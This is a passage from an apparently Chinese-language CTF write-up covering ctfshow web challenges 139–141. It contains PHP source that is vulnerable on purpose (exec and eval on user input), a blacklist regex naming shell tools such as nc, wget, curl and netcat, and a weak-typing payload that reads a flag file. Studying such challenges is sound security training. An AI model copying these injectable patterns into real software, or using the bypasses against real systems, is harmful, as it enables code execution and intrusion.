    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?>
```
## web140（函数利用）
```php
<?php

error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['f1']) && isset($_POST['f2'])){
    $f1 = (String)$_POST['f1'];
    $f2 = (String)$_POST['f2'];
    if(preg_match('/^[a-z0-9]+$/', $f1)){
        if(preg_match('/^[a-z0-9]+$/', $f2)){
            $code = eval("return $f1($f2());");
            if(intval($code) == 'ctfshow'){
                echo file_get_contents("flag.php");
            }
        }
    }
}


```
考察函数利用，f1和f2只能由数字字母组成，观察第11行发现是弱类型比较，如果满足intval($code)=0条件即可成立，因为弱类型比较时会将类型也转为一致，即ctfshow会被转为intval('ctfshow')=0，满足条件，所以第10行利用一个无返回值函数usleep，执行结果无返回，$code为空，intval($code)=0
payload：f1=usleep&f2=usleep
## web141（函数利用，正则匹配）
```php
<?php

#error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/^\W+$/', $v3)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}

```
看第11行的正则匹配，有个小坑
\w：用于匹配字母，数字或下划线字符； 
\W：用于匹配所有与\w不匹配的字符； 
注意这里的是大写W，即v3中不能有字母，数字或下划线字符
